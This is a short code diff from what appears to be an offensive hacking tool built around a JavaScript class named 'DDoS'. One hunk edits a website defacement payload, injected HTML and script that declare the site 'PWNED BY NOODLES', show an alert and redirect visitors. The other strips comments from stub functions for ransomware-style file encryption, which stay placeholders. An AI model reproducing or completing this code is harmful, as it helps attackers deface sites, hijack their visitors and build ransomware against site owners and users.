@@ -256,7 +256,7 @@ class DDoS {
    const defaceHTML = `<body style="background-color: black; color: red; font-size: 5em; text-align: center;">
      <h1>${originalTitle} HAS BEEN PWNED BY NOODLES</h1>
      <p>Get Noodled!</p>
-     <img src="https://i.imgur.com/random_image.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
+     <img src="https://github.com/Genera1Developer/Noodles/raw/main/assets/banner.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
      <script>
       alert('YOU HAVE BEEN HACKED BY NOODLES');
       window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
@@ -406,17 +406,14 @@ class DDoS {
     }
 
     async function getAllFiles() {
-     // Implement code to get all accessible files
      return [];
     }
 
     async function encryptFile(file, key) {
-     // Implement encryption logic here using the key
      return 'ENCRYPTED_' + file;
     }
 
     async function replaceFile(file, encrypted) {
-     // Implement logic to replace the original file with the encrypted version
     }
 
     encryptData('${key}');
